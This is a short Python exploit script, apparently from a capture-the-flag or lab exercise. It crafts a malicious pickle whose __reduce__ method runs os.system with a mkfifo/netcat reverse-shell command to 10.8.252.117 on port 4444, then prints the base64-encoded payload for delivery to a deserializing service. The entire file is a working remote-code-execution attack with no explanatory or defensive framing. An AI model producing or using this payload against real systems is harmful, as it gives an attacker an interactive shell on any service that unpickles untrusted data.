import pickle
import sys
import base64

command='rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | ' '/bin/bash -i 2>&1 | netcat 10.8.252.117 4444 > /tmp/f'

class rce(object):
	def __reduce__(self):
		import os
		return (os.system,(command,))
print(base64.b64encode(pickle.dumps(rce())))
